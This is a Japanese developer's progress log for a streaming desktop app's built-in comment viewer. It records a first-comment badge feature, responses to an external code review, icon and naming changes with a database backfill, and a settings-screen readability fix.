実機フィードバックで 2 件。①**その配信で初めてしたコメント**を目立たせる ②**初見/久しぶり**のコメントも目立たせる。

⚠ **意匠は途中で 1 回作り直している**。当初の指定は「**太字**・枠の色は変えなくてよい」だったが、実機で
**分かりにくい**と判断され、「**「初コメ」バッジ ＋ 初見と同じ枠色**」へ変更（＋「**課金チャットかつ初コメは
バッジのみで枠に色を付けない**」）。結果として **038c（初見/久しぶり）と同じ表現方式に 3 種すべてが揃った**。
太字は完全に撤去済み。判定ロジック（下記 `firstOfStream.ts`）は作り直しの影響を受けていない
——**表現だけを差し替えられる形になっていた**のが効いた。

### ⚠ ② は ① に論理的に包含される（それでも OR で明示的に書いた）

Rust の判定（`viewer_memory/repository.rs`）は `first_time = prior_last.is_none()`（DB に viewer 行が無い＝
人生初コメント）と `long_absence = 直前の最終コメントから 1 ヶ月以上`で、**どちらもその視聴者の「来訪の
1 件目」にしか付かない**。配信 1 本は 1 ヶ月より短いので、**バッジが付いたコメントは必ずその配信の初コメント**
＝ ① を実装すれば ② は自動的に満たされる。

それでも**① と ② を独立した条件としてコードに書いた**（`badge?.firstTime` / `badge?.longAbsence` /
`firstOfStreamIds?.has(id)` の 3 つを別々に評価する）:

- `record_comment` の invoke が失敗すると `badges` は空になるが、`firstOfStreamIds` は frontend 計算なので出る
  ＝**片方が落ちてももう片方が効く**（① のほうが頑健）。
- 「初コメ **または** 初見/久しぶり」という要件がコードにそのまま書いてあれば、**包含関係の証明に依存せず
  それぞれ独立にテストで固定できる**（実際、片方の条件を消すと片方のテスト群だけが落ちることを確認済み）。

⚠ **訂正（外部レビュー Q-4・2026-07-31）**: ここは当初「条件は
`firstOfStreamIds?.has(id) || badge?.firstTime || badge?.longAbsence` と並べて書いた」と記録していたが、
**その式は実装に存在しない**——意匠の作り直し（太字 → 枠色）に伴って下記のとおり `else if` 連鎖（排他）へ
変えたため。上記 2 つの性質（片方が落ちてももう片方が効く／独立にテストで固定できる）は `else if` でも
そのまま成立するので、**主張は有効・記述だけが古かった**。同じ節の後半と食い違っていたので直した。

### 判定の実体（新規 `firstOfStream.ts`）

`viewerId → その視聴者がこの配信で最初にしたコメントの id` の Map を持つ純関数（`monetaryFeed.ts` と同じ作法）。

- **既記録の viewerId は絶対に上書きしない**。これが冪等性の実体で、①React StrictMode の updater 二重実行
  ②同一コメントの再送 ③jewels の combo 更新 のいずれにも耐える。
  ⚠ **素直に「見た Set に無ければ記録」と書くと壊れる**——二重実行の 2 回目に 1 回目の副作用が見えて判定が
  消える。加えて上書きを許すと**同じ視聴者が喋るたび太字が最新行へ移動**し、「今日はじめて喋った人」という
  意味そのものが失われる。
- 「見た viewerId の Set」＋「初コメント id の Set」の 2 本立てにせず **1 本の Map に畳んだ**（2 つの state が
  同時に動かないと壊れる形を作らない）。表示側が要る `Set<commentId>` は `values()` から導出する。
- 呼び出しは `mergeMonetary` と**同じ位置**（`setComments` の updater の外・同じ `incoming` から独立に導出）
  ＝**updater 内で別の setState を呼ぶ入れ子を作らない**という既存の方針を守る。`added` ではなく `incoming` を
  渡してよいのは、上書き禁止なので再送も combo 更新も自然に no-op になるため（`MAX_COMMENTS` クランプから
  落ちた行に後から combo 更新が届いて `added` に載る既知の挙動にも影響されない）。
- 窓のマウント単位で持つ＝**窓を開き直したら初期化**される。038a の `sessionIdRef` と同じ粒度で「その配信」の
  定義が揃っている。永続化しない（`viewerBadges` と同じ扱い）。

### 表現（バッジ＋枠色）と、そこから必然的に出てきた「排他」

- 「初コメ」バッジ＋枠色 `var(--ok)`（**初見と同じ緑**）。チップ色も `.badgeFirstTime` とセレクタを束ねて
  同じトークンを共有する（値を 2 箇所に書かない＝片方だけ色を変えて割れる余地を作らない）。
- **課金カード上は枠に色を付けない**（バッジのみ）。既存の抑止セレクタに `.item.itemTipCard.itemFirstComment`
  を足しただけ——依頼者の指定は**初見/久しぶりが既に受けている扱いとまったく同じ**だった（047b の
  「ヘッダ帯の色が主信号で、枠まで別の意味を持つと信号が競合する」）。バッジは `.tipChip` の器で帯に出る。
- **OBS オーバーレイには出さない**（配信画面に出す情報を増やす判断は別件）。

⚠ **クラス付与を「素朴な並列」から `else if` の連鎖へ変える必要があった**。優先順は
**初見 > 久しぶり > 初コメ**（情報量の多い方を残す＝038c の「初見優先」と同じ考え方）。理由は、
038c の判定が論理的に「その配信の初コメント」に含まれるため、並列に足すと:

1. **久しぶり（青枠）と初コメ（緑枠）が同じ行に同時に付く** → 勝敗が CSS のソース順で決まり、コードから
   意図が読めない状態になる。**太字のときは無害だったので気付けなかった**（色になって初めて衝突する）。
2. **「初見」と「初コメ」のバッジが二重に出る。**

どちらもミューテーション（`else if` を並列へ戻す）で実際にテストが落ちることを確認済み。

### ⚠ テストは 2 段構えが必須だった（CSS モジュールの穴）

実測で分かったこと: **CSS モジュールは vitest 上で存在しないキーでも文字列を返す**
（`styles.nonExistentKey` → `"_nonExistentKey_b575a2"`）。つまり `className` に `styles.itemFirstComment` が
入っていることを確かめても、**CSS 側にルールが無い／クラス名を打ち間違えている**状態がそのまま緑になる。
太さ自体も jsdom では測れない。

そこで層を分けた:

| 層 | 何を守るか |
|---|---|
| `CommentList.test.tsx`（+5） | **誰にどのバッジ/クラスが付くか**（初コメ／2 件目は付かない／初見は「初見」だけ／久しぶりは青枠のまま／課金はバッジのみ／未指定なら無装飾） |
| `scripts/check-css-guards.mjs`（ガード (5)） | `.itemFirstComment` が**実在し** `border-color: var(--ok)`＝**初見と同じ**であること（(5-a)）／**課金カードの抑止セレクタに 3 種すべてが載っている**こと（(5-b)） |
| `firstOfStream.test.ts`（新規 8） | 判定そのもの（上書きしない・source 違いは別人・冪等・同一参照 early-out） |

**ミューテーション 5 パターン**でそれぞれ対応する検査だけが落ちることを実測した:
`else if` を並列へ戻す（→ 二重バッジ・枠色衝突の 2 ケース）／「初コメ」バッジを出さない（→ 2 ケース）／
枠色を `--info` にする（→ ガード 5-a）／課金の抑止セレクタから外す（→ ガード 5-b）／
`trackFirstOfStream` の上書き禁止を外す（→ 純関数テスト 5 ケース）。

⚠ ガード (5-a) は `.itemFirstTime` 側の色も同時に検査している。「初コメは**初見と同じ色**」が要件なので、
**初見の色だけを将来変えると片方だけ動いて要件が静かに壊れる**——そこを機械で止めている。

### 検証

`typecheck` / `lint` / `test`（**26 files / 458 tests** ＋ CSS guard）すべて green。
`src-tauri/`・sidecar・`package.json`・`docs/security.md` は**差分ゼロ**。新規依存・外部通信・保存・ログはゼロで、
扱うのは端末内の真偽判定のみ（§9 に触れない）。

### E2E（手動）確認チェックリスト —— 051

> ⚠ 本タスクも実機フィードバック由来だが、**作り直した意匠（バッジ＋枠色）そのものが未確認**。

**G-1 その配信の初コメントにだけバッジと緑枠が出る**
- 手順: 同じ視聴者が 2 回コメントする（mock なら同一 `author.id` が再度出るのを待つ）。
- 期待: **1 件目にだけ**「初コメ」バッジ＋緑枠。2 件目は無装飾。
- 失敗したら: 2 件目にも付く＝`trackFirstOfStream` の上書き禁止が壊れている。1 件目にも付かない＝
  `CommentViewerApp` から `firstOfStreamIds` を渡していない（配線テストで検知できるようにした）。

**G-2 初見・久しぶりの行と二重にならない**
- 手順: 初見判定が付く視聴者（DB に居ない人）のコメントを見る。
- 期待: 「初見」だけが出る（「初コメ」は出ない）。枠は緑 1 本。久しぶりの行は「久しぶり」だけ＋青枠。
- 失敗したら: バッジが 2 つ出る／枠色が競合する＝`CommentList` の `else if` 連鎖が並列に戻っている。

**G-3 課金カード × 初コメはバッジのみ**
- 手順: 初コメの投げ銭（その配信で初発言がスパチャの人）を出す。
- 期待: ヘッダ帯の中に「初コメ」チップが出るが、**カードの枠はティア色のまま**（緑にならない）。
- 失敗したら: 枠が緑になる＝`.item.itemTipCard.itemFirstComment` の抑止が効いていない（CSS guard 5-b/5-b'）。

**G-4 ⏳ 信号が薄まらないか（調整判断・下記）**
- 手順: 実配信で 10〜20 分見る。
- 期待/判断: 一覧の大半が緑枠になっていないか。**なっていたら下記の「1 行で戻せる」対応を取る**。

**G-5 依頼者への確認事項**: 要望②（初見/久しぶりも目立たせる）について、**今回②の見た目は 1 ピクセルも
変わっていない**（038c の時点で既にバッジ＋枠色があり、①を足したことで 3 種の表現方式が揃った、という整理）。
**「②は既存表示で足りている」で合意が取れるかを実機で確認すること。** 足りないと言われた場合の候補＝
初見/久しぶりだけ枠を太くする・チップに強調を足す（初コメ側を弱めるのではなく、②を強める方向で調整する）。

### ⏳ 実機で見てから調整すること

**一見さんが多い配信では、一覧の大半が「初コメ」＋緑枠になって信号が薄まる可能性がある。**「その配信で
初めて」は 1 回だけ喋って去る視聴者すべてに当たるため。これは流量と常連比率次第で、実機で見ないと判断できない。
そうなった場合は「初見/久しぶりのみ」に絞れる＝`CommentViewerApp` から `firstOfStreamIds` を渡すのをやめる
**1 行**で戻せる（`CommentList` 側は未指定なら従来どおり無装飾）。

⚠ **初見と初コメが同じ緑枠**なので、枠だけを見ると 2 種が区別できない（区別はバッジ文言が担う）。
これは「初見さんと同じ色の枠」という明示指定に従ったもの。再検討条件＝実機で「初見なのか初コメなのかが
枠から分からなくて困る」となったら、初コメ側を別トークン（例: --muted 系の弱い枠）へ落とす。

⚠ **配信中にコメントビューアを閉じて開き直すと、その後は全員がもう一度「初コメ」になる**
（外部レビューの指摘で、実装の言葉＝「窓のマウント単位で初期化」だけでなく**ユーザーから見た症状**として
明記する）。Map は窓のマウント単位で持ち永続しないため。038a の `sessionIdRef` と同じ粒度なので
「その配信」の定義自体は揃っているが、`sessionIdRef` が記録用（画面に出ない）なのに対し**こちらは
画面に誤った信号が出る**という違いがある。据え置く理由＝配信中に窓を開き直す運用が常態ではなく、
永続化すると「その配信で初めて」の定義そのものを別に持つ必要が出る（配信の開始/終了の検出が要る）ため。
再修正トリガー＝実機で開き直しが常態化する／開き直した直後の緑枠だらけが実害になったとき。

## 2026-07-31 (050 / 047f / 051 の外部レビュー対応 —— セキュリティ問題なし・要修正はすべて「テストの穴」)

3 タスク分の未コミット差分（HEAD `4a1e88d` からの 15 変更＋新規 3）に対する外部レビュー（security-review ＋
品質レビュー）への対応。**セキュリティ判定は「問題なし」・修正必須 0 件**。品質の要修正 3 件は
**いずれもコードの欠陥ではなく「退行を検出できない」穴**だった。

### セキュリティ: 条文への当てはめは再検証されて妥当。ただし記述を 1 行直した

- §1（外部通信）・§1 例外 032c-c ＋ 049 追補・§9・§10・レビュー必須条件のすべてについて、レビュー側が
  **独立にコマンドで実測**して「security.md 更新不要」を確認した（`src-tauri/`・sidecar・`package.json`・
  `pnpm-lock.yaml` の差分ゼロ／追加行の `fetch(`・`invoke(`・`WebSocket`・`http(s)://` が 0 件〔untracked 3
  ファイルを含む〕／`voicevox.ts` の `console.*` が 0 行／`csp: null`・capability 不変）。
- ⚠ **ただし 049 追補の記述が 1 行だけ現状と食い違っていた**（レビュー S-1）。「`console.debug` に出るのは
  **破棄件数**だけ」と書いてあるが、050 が**事象名**のログ（再生打ち切り）を 1 行足している。
  **§9 の実質（本文・投稿者名・URL を出さない）は不変**なので条文違反ではないが、次に §9 を根拠に判断する人が
  「TTS のログ面＝破棄件数だけ」と読む余地があるため、**`docs/security.md` の当該行を「破棄件数と事象名だけ」へ
  訂正した**（訂正である旨も追補内に明記）。049 で条文を見落とした前例と同じ形の芽を残さないための処置。
  ⚠ これにより **051 節までの「`docs/security.md` は差分ゼロ」という記録は、本レビュー対応ぶんだけ変わる**
  （3 タスクの実装自体は security.md を触っていない、という記録は有効）。
- ⚠ 実装者が使った論法「**送る量を減らす方向の変更は原理的に条文に触れない**」は、結論は正しいが
  一般化しすぎ（レビュー S-2）。条文には義務条項（「URL/絵文字を除去してから送る」）も混ざっており、
  "減らす"変更でも義務を外せば違反になる。**正とすべきは論法ではなく手順**＝条文を
  ①宛先 ②許可 API ③送信内容 ④依存 ⑤capability/CSP ⑥保存・ログ の 6 項目に分解し、1 つずつ当てること。
- §9 追補（046a）・レビュー必須条件「端末保存」への非該当も再確認。**047f が増やすのは露出の「量」だけ**
  （最大 50 件 → 防御上限 500 まで・種類は 047 と同じ表示名/金額/アバター）で、条文の発火条件は**永続化**
  なので該当しない、という整理は妥当と確認された。

### 要修正 3 件（すべてテストの穴・**実測でミューテーション生存を確認してから直した**）

**Q-1【050】`synthesize` の 2 回目の fetch（`POST /synthesis`）から `signal` を落としても、458 テストが全部緑だった。**
実挙動では 050 の目的そのものが壊れる——合成が詰まるとしたら推論を回す `/synthesis` の方が本命で、そこから
signal が落ちると `setTimeout` が abort しても **fetch は中断されず `synthesize` が返らない＝`playing` が
true 固定の永久ハングが復活**する。しかも `/audio_query` 段ではタイムアウトが効くので「たまに固まる」に化ける。
→ `voicevox.test.ts` に **2 回の fetch 両方へ同一の signal が渡ること**を固定するケースを追加（＋未指定でも
動く回帰）。「body 読みまで効くこと」は恒真式なので固定しない、という既存の割り切りとは**別物**
（どの fetch に何を渡すかは実装が決めていること＝壊せる）。

**Q-2【047f/051】本体（`CommentViewerApp`）からの配線が、どちらもテストで守られていなかった。**
`mergeMonetary` の第 3 引数 `isRead` の注入行を消す／`CommentList` の `firstOfStreamIds` prop 行を消す、の
どちらも **458 テスト全緑**（＝機能が丸ごと消えても誰も気付けない）。これは 047 レビュー Q-2
（`comments.filter` への書き戻し）・049 レビュー Q-2（getter の注入消失）と**同型の穴の 3 回目**。
→ `CommentViewerApp.toolbar.test.tsx` に 2 ケース追加（60 件未読で「未読 60」＋ピル 60 個／同一視聴者 2 件で
「初コメ」が 1 件だけ）。どちらもミューテーションで落ちることを実測。
**定型として扱うこと＝「optional な注入を足したら、本体経由のケースを 1 つ足す」。**

**Q-3【051】太字の残骸がコメントに 4 箇所残っていた**（実装からは撤去済み・docs も「完全撤去」と記録）。
特に `CommentList` の `firstOfStreamIds` prop の JSDoc が「**本文を太字にする・枠色は変えない**（依頼者の
指定）」と**現仕様と正反対**で、次に触る人が `.itemFirstComment` の枠色を「指定違反」と誤認しうる状態だった。
→ 4 箇所（`CommentList.tsx` の prop JSDoc／`CommentViewerApp.tsx` の state コメント／`firstOfStream.ts` の
docstring／`firstOfStream.test.ts` の docstring）を現仕様へ書き換え。

### コード修正（挙動が変わるのは 1 件だけ）

- **`MonetaryTicker` が `DOM_DELTA_PAGE`(2) を扱っていなかった**（レビュー Q-8・**唯一の挙動変更**）。
  ページ単位の `deltaY`（±1 程度）を px と解釈するため、**1px しか動かないのに `preventDefault()` で親の
  縦スクロールだけ殺す**という最悪の組み合わせになっていた。→ `deltaMode` が 0/1 以外なら**既定動作へ流す**
  （換算を足すより「知らない単位に手を出さない」を選ぶ）。現代のブラウザはまず出さないので実害の確率は低い。
- **`trackFirstOfStream` が 1 件挿入ごとに Map を丸ごと複製していた**（レビュー Q-13）→ 複製は初回のみ
  （`next ??= new Map(prev)`）。バッチ k 件・既存 m 件で O(k·m) → O(m+k)。配信開始直後の一斉挨拶で効く。
- **CSS guard (5) に 3 つの穴があった**（レビュー Q-10）:
  - (5-c) 新設＝**`.badgeFirstTime, .badgeFirstComment` の束ねルールの実在**を検査する。「初コメのチップは
    初見と同じ色」を値の重複ではなく**セレクタの束ね**で担保しているので、束ねから外れると**無音で
    無彩色に戻る**（枠色〔5-a〕と同じ穴がチップ側にもあった）。
  - (5-b') 新設＝**抑止ルールに `border-color` 宣言が実在すること**。セレクタだけ検査していたので、
    宣言を消すと素通りしていた。
  - (5-b) 修正＝「3 種が**1 ブロックに束ねられている**」前提の正規表現をやめ、**セレクタごとに個別に探す**形へ。
    束ね前提だと、将来ルールを 2 つに分割しただけで**正しい CSS なのに fail**し、しかもメッセージが
    「セレクタがありません」になって真因と食い違う。3 パターンのミューテーションで確認済み
    （束ねから外す→落ちる／宣言を消す→落ちる／**ルールを 2 つに分割→通る**〔誤検知しない〕）。

### コメント化（修正せず、意図・理由・再修正トリガーを残したもの）

- **`readMonetaryIdsRef` の 1 レンダー遅れ**（レビュー Q-11）: 「残しすぎる方向にしか効かない」という論証は
  **正しい**（`setReadMonetaryIds` が唯一の更新点で既読集合は縮まないことを実測確認）。ただし
  **その前提がコメントに書かれていなかった**ので明記した。再修正トリガー＝「ティッカーをクリア」等で
  **既読が減る経路**を足すとき（ラグの向きが反転し、未読を捨てるようになる）。
- **`decodeAudioData` が返らないときの watchdog 漏れ**（レビュー Q-9）: 定数コメントは「依然ハングする」と
  書いていたが、**そのとき 1 Hz の `setInterval` も `dispose` 後まで回り続ける**ことは書いていなかった。
  実害は 1 Hz タイマー 1 本ぶんなので放置するが、「解除漏れは無い」と読まれないよう明記。
- **`MonetaryTicker` の callback ref が React 19 の機能に依存**（レビュー Q-16）: 18 以前へ落とすと
  **無音でリスナが外れなくなる**旨と、その場合の書き換え方針をコメントに追記。
- **`MonetaryTicker.test.tsx` の `section > div:nth-of-type(2)`**（レビュー Q-14）: トラックには role も
  aria-label も無く、テストのためだけに `data-testid` を実装へ足すのを避けた判断と、**構造が変われば
  ケースが落ちる（静かに緑にならない）**ことを明記。
- **`CommentViewerApp` のポーリング effect のコメント**（レビュー Q-6・052 の前倒し分）: 「宛先は loopback で
  **応答は即時**」「再検討条件＝応答遅延で tick が滞留するなら AbortController + タイムアウトを導入する」が
  **現状と食い違っていた**（050 はまさにその条件が満たされる前提で作られたタスク）。**挙動は 1 文字も変えず**、
  前提が崩れたこと・実害（バナーすら出ない／pending が 5 秒ごとに積み上がる）・052 の方針をコメントに明記。
  誤った前提のコメントが「検討済みで問題なし」というお墨付きとして働くのを止めるため。

### docs の訂正

- **タスク番号 051 の衝突を解消**（レビュー Q-5）。同じ 2026-07-31 に「051 その配信の初コメント」と
  「051 `checkEngineRunning` のタイムアウト」を起票していた。初コメ側はコード・CSS・CSS guard のコメントに
  **19 箇所** 051 を書き込んでいるのに対し、`checkEngineRunning` 側は task-board の数行だけだったので、
  **`checkEngineRunning` を 052 へ改番**した（改番の理由も board に残した）。
- **存在しないコード形の記録を訂正**（レビュー Q-4）。051 節と task-board に「条件は
  `firstOfStreamIds?.has(id) || badge?.firstTime || badge?.longAbsence` と並べて書いた」とあったが、
  **その式は実装に存在しない**（意匠の作り直しに伴い `else if` 連鎖へ変えたため）。同じ節の後半と
  食い違っていた。主張の中身（片方が落ちてももう片方が効く／独立にテストで固定できる）は `else if` でも
  成立するので、記述だけを直した。
- **050 タスクファイルから残っていた行番号を削除**（「126 行〜」「235-239 行」）。同ファイル冒頭で
  「行番号は書かない」へ方針転換したのと矛盾していた。テスト数の表記も「050 完了時点」と明示。
- **E2E チェックリストを 3 タスク分に揃えた**（レビュー 26 番）。
  - 050 の「準備」に **Network パネルが実際に読めることの事前確認**を追加。E2E-1（Time の合計）と
    E2E-2（`(canceled)` か `failed` か）は Network に全面的に依存しており、読めないと 2 項目が実行不能
    ——「タイムアウトと通常失敗を同じログにする」設計の運用コストがここに出る。読めない場合の縮退手順も記載。
  - **047f（F-1〜F-5）・051（G-1〜G-5）を新設**。どちらも E2E で見つかった不具合の修正なのに、
    その修正自体の確認手順が箇条書き 1 行しか無かった（050 だけ 10 項目あった）ため、同じ
    「手順／期待／失敗したら何を疑うか」の形式へ引き上げた。
  - **G-5 として依頼者への確認事項を明示**: 要望②（初見/久しぶりも目立たせる）について、**②の見た目は
    今回 1 ピクセルも変わっていない**（038c で既にバッジ＋枠色があり、①を足したことで 3 種の表現方式が
    揃ったという整理）。「②は既存表示で足りている」で合意が取れるかを実機で確認すること。
- **「窓を開き直すと全員がもう一度『初コメ』になる」をユーザーから見た症状として明記**（レビュー 16 番）。
  従来は「窓のマウント単位で初期化」という実装の言葉でしか書かれていなかった。据え置く理由と
  再修正トリガーも併記。

### レビューで「妥当」と判定された「やらなかった判断」（記録）

050 のスコープ 1/3 縮小（可視化・経路3・`MAX_BACKLOG`）／`checkEngineRunning` を別タスクにしたこと／
`MAX_PRIORITY_BACKLOG` の破棄（そもそも `console.debug` が出るので「無言」ではない）／
`docs/tasks/` に 047f・051 のファイルを作らなかったこと（progress + board から再構成可能）／
`playWav` の abort ハンドラで例外を握り潰す判断（握るのは `stop`/`disconnect` の 2 呼び出しだけで、
投げうるのは実質 closed context ＝ `ctx.resume()` があり得ない経路のみ）／`SYNTH_TIMEOUT_MS` を
未実測の暫定値のまま置く判断（リスクの非対称性＋再調整トリガーが書かれている）。

### 検証

`typecheck` / `lint` / `test`（**26 files / 462 tests** ＋ CSS guard）すべて green。
追加した 5 ケースは**すべてミューテーションで落ちることを実測**（`/synthesis` の signal 削除／
`/audio_query` の signal 削除／`isRead` 注入の削除／`firstOfStreamIds` prop の削除）、
CSS guard の新規 2 検査も同様（束ねから外す／宣言を消す）＋**ルール分割では誤検知しない**ことを確認。
`src-tauri/`・sidecar・`package.json`・`pnpm-lock.yaml` は引き続き**差分ゼロ**（`docs/security.md` のみ
上記の記述訂正で 1 箇所変更）。

⏳ **実機確認は依然としてゼロ件**。次にやるべきはコードではなく **E2E（050 の 10 項目＋047f の F-1〜F-5＋
051 の G-1〜G-5）**。

## 2026-08-01 (053 内蔵コメントビューアの アイコン・名称・説明)

実態と見た目が釣り合っていなかった。032c〜051 の積み上げで YouTube/Twitch 同時取得・VOICEVOX 読み上げ・
OBS 透過オーバーレイ・投げ銭ティッカー・視聴者メモリまで揃っているのに、ツール一覧では
**name=「コメントビューア」/ description=空文字 / icon_png=NULL** のままで、アイコン欄は `toIconLetter` の
フォールバックで**先頭 1 文字「コ」**、説明欄は**空の `<p>`**（名前の下が空白）だった。

### 決めたもの

- **名前**: `コメントビューア for StreamDock`
  ⚠ **当初は `StreamDock コメントビューア`（既存のオーバーレイ 2 窓と揃う語順）で実装したが、実機で
  サイドバーが見切れて `StreamDo…` しか出ず何のツールか分からなくなった**ため、機能名を先頭へ入れ替えた。
  サイドバーのツール行で名前に使える幅は **約 82px** ——300px の列から `.sidebar` の左右 padding 48px・
  行の border/padding 22px・アイコン 30px・「内蔵」バッジ約 36px・**編集/削除ボタン 52px
  （`opacity: 0` でも場所は占有する）**・gap 30px を引いた残りで、13px フォントなので**全角 6 文字強**で
  `text-overflow: ellipsis` に当たる。この語順なら「コメントビュ…」まで出て用が足りる。
  フルネームが読めるのは ①ツール管理の行（`.info h4` は折り返し無しの `1fr` 列）②サイドバーのホバー
  （`title={tool.name}`）③ツール追加ピッカー／プリセット作成／プレビューカード。
  ⚠ **窓のタイトルバー（`lib.rs` の `.title(...)`）も同じ名前へ揃えた**。033a で窓の中の `<h1>` を
  「OS タイトルと重複」として削除して以来、**ここが窓に出る唯一の文言**なので、揃えないと窓だけ旧名が残る
  （実機で指摘されて追加修正した）。この窓のタイトルには **OBS 自動追加の文字列契約は無い**
  （044a の対象はオーバーレイ 2 窓のみ）ため単独で変更でき、オーバーレイ 2 窓のタイトルとは相互に
  部分文字列にならないので sidecar の `includes` 一致が取り違えることもない（契約テスト 4 本 green を確認）。
  ⚠ ただし **`lib.rs` のエラーメッセージ 3 本だけは「コメントビューア」のまま**にした——あれは製品ではなく
  「窓」を指す文で、製品名を入れると「…for StreamDockを開けませんでした」と助詞が直結して読めなくなる。
- **説明**: `YouTube & Twitch 同時配信対応。読み上げ・OBS表示・投げ銭管理・視聴者管理、すべてワンクリックで`
  ⚠ 入力欄が `<input>`（**改行・箇条書き不可**）なので 1 行に収める。表示側はツール一覧が全角 45〜55 文字/行、
  プレビューカードが 20〜25 文字/行で素直に折り返す（clamp/ellipsis なし）。
  ⚠ 既存ツールの説明は**体言止めの短句**（「順番なしで並行起動」等 4〜11 文字）だが、ここは
  **依頼者の指定で意図的にキャッチコピー体**にしている（対応サイトと主要機能を一目で伝えるため）。
- **アイコン**: 依頼者提供の PNG（青地の角丸四角＋白のアイソメトリックな吹き出しと台座）を **128px 角**にして
  `src-tauri/icons/tool-comment-viewer.png` へ同梱。128 は `tools/icon.rs` の `MAX_ICON_PX = 128`
  （外部ツール抽出アイコンの上限）と同値。**適用範囲はツール一覧のアイコンのみ**。

### アイコンを DB の `icon_png` に載せた理由（frontend 無改変）

`IconTile` の `imageSrc` 経路（`iconDataUri(tool.iconPng)` → `data:image/png;base64,…`）は
**既に 6 面すべてで動いている**: ツール管理の行 / サイドバー / ＋ツール追加ピッカー /
プリセット作成 Step1・Step2 / プレビューカード。

→ **外部ツールのアイコンとまったく同じ経路に載せるだけで 6 面すべてに反映される**。内蔵ツール専用の分岐も、
`public/` からの新しいアセット参照経路も作らずに済んだ（`include_bytes!` でビルド時に焼き込むので、
実行時のファイル読み込みも配布物への同梱も不要。`bundle.icon` は明示的なファイル配列なので、
このファイルがアプリのバンドルアイコンに混ざることもない）。`base64 = "0.22"` は `tools/icon.rs` が
使用中の**既存 dep**＝新規依存ゼロ。

編集で消えないことは経路を追って確認済み: `AddToolScreen` は `setIconPng(editingTool?.iconPng ?? null)` で
読み込み、保存時に `iconPng: isUrlKind ? undefined : iconPng ?? undefined` で送り返すので round-trip する。

### ⚠ seed だけでは既存インストールに永久に届かない（backfill を足した）

`INSERT OR IGNORE` は既存行を一切触らない。このリポジトリには**マイグレーション基盤が無い**
（スキーマは `CREATE TABLE IF NOT EXISTS` ＋ `ensure_column`）ので、「毎起動流す冪等な UPDATE」が唯一の手段。
実装前に実 DB を見たところ当該行は `name='コメントビューア' / description='' / icon_png=NULL` のままで、
**seed を直すだけでは開発機にも本人にも何も起きない**状態だった。

そこで backfill を **2 本に分けた**。同じ行でも**列によって「誰のもの」かが違う**ため:

| 列 | 誰のもの | 方針 |
|---|---|---|
| `name` / `icon_png` | **アプリ** | **常に上書き**。内蔵ツールは UI 上「表示名・種別は変更できません」と明示され入力欄も readOnly なので、実装側が固定値で揃えるのが仕様どおり |
| `description` | **ユーザー** | **空のときだけ**埋める。内蔵ツールでも編集可のまま残す既存判断（`AddToolScreen.tsx` の「説明だけは通常ツールと同様に編集可のまま」注記）があり、毎起動上書きすると**ユーザーが書き換えた説明が再起動のたびに消える** |

### 文言の追随と、触らなかったもの

- 追随: `AddToolScreen.tsx` 3 箇所（フォールバック見出し・内蔵ツールの説明文 2 本）＋
  `lib.rs` のエラーメッセージ 3 本（前面表示 / 開く / 閉じる）。
- **ウィンドウタイトル（`lib.rs` の `.title("コメントビューア")`）は据え置き**。OBS 自動追加の文字列契約の
  対象外なので変更自体は可能だが、今回のスコープ（ツール一覧での見え方）と分けたい。
- ⚠ **オーバーレイ 2 窓のタイトルには触っていない**。`obs-client.ts` の対応表と `lib.rs` の `#[cfg(test)]` が
  `include_str!` で**文字列一致を assert**しており、変えると Rust テストが 3 本落ちる。
- **アプリ本体のバンドルアイコン**（`icons/*.png` / `.icns` / `.ico` / `public/icon.png`）は変更なし。
- **ウィンドウアイコン**も付けていない（`WebviewWindowBuilder` に `.icon()` を足す前例が無く、
  macOS はウィンドウ単位アイコンを持たないので実質 Windows 専用の効果）。

### 検証

`cargo check` / `cargo test`（**95 passed**・ウィンドウタイトルの契約テスト 3 本を含む）、
`typecheck` / `lint` / `test`（**26 files / 462 tests** ＋ CSS guard）すべて green。
`docs/security.md` は変更なし——新規外部通信・保存範囲の変更・ログ追加はゼロで、画像はアプリに同梱した
ローカル資産を `data:` URI として描くだけ＝§CSP「外部 image を読み込まない」を維持している。

**実機で確認すること**: (a) 6 面すべてでアイコンが出るか（タイル背景が透明になる＝`.iconTile:has(img)` が
効き、画像の青地がそのまま出る） (b) 説明文の折り返し（一覧で 1 行に収まるか・プレビューカードで何行か。
長すぎたら定数 1 箇所で短縮版〔`投げ銭・視聴者管理`〕へ差し替え） (c) 説明を書き換えて保存 → **アイコンが
消えない**か (d) 説明を書き換えて再起動 → **書き換えが保持される**か（backfill ② の確認）
(e) 既存 DB で**名前とアイコンが実際に更新される**か（backfill ① の確認）。

## 2026-08-01 (054 内蔵コメビュ設定画面の可読性修正 —— 「項目名」の書式が同じカードに 2 系統あった)

実機フィードバック起点。コメビュ窓の設定画面で「読み上げの文字数上限」「話者」といった**設定項目名が、
その下の補助説明文とまったく同じ見た目**で、どこが項目名でどこが説明か読み取れなかった。原因は
`CommentViewerApp.module.css` の 3 クラスの実測値がこうなっていたこと:

| クラス | 旧 | 役割 |
| --- | --- | --- |
| `.speakerField` | 11px / `--text-faint` / weight 400 | 設定項目名（文字数上限・話者・スタイル・フォント） |
| `.note` | 11px / `--text-faint` / weight 400 | 補助説明文 |
| `.toggleLabel` | 13px / 700 / `--text` | トグルの設定項目名 |

`.speakerField` と `.note` は**指定が完全に同一**、そして `.toggleLabel` だけが別書式。つまり同じカードの中に
**「設定項目名」の書式が 2 系統**あった。さらに `--text-faint` は theme.css で `--muted` をさらに 72% まで
薄めた色で、同じモジュール内の `.btn:disabled` / `.dangerBtn:disabled` が使う「押せない」を意味する濃度——
**無効色をラベルに当てていた**。

### 確定した 3 段の規則（コメビュ窓の中の正）

`CommentViewerApp.module.css` の先頭にコメントで明文化した。

| 役割 | 色 | サイズ | 太さ | 実体 |
| --- | --- | --- | --- | --- |
| **設定項目名** | `var(--text)` | 13px | **700** | `.toggleLabel` / `.fieldLabel`（新設） |
| **補助説明** | `var(--muted)` | 12px | 400 | `.note` / `.obsPasswordHelp`（`line-height:1.5`） |
| 無効状態 | `var(--text-faint)` | ― | ― | `.btn:disabled` / `.btnGhost:disabled` / `.dangerBtn:disabled` |

⚠ 表の 3 段目は当初「無効・**プレースホルダ**」＋実体 `*:disabled` と書いていたが、レビュー指摘で改めた。
`*:disabled` というセレクタは実在せず（実体は上記 3 ルール）、`::placeholder` ルールもこのモジュールには
1 つも無い（プレースホルダで faint を使うのは `formLayout.module.css` 側）。**「この窓の正」を名乗る表に
実体の無い行を載せると誤読を生む**ので、プレースホルダは表から外して本文の注記に落とした。
またこの表は「3 役割の正」であって窓の書式の網羅ではない（下記「別段のもの」を参照）。

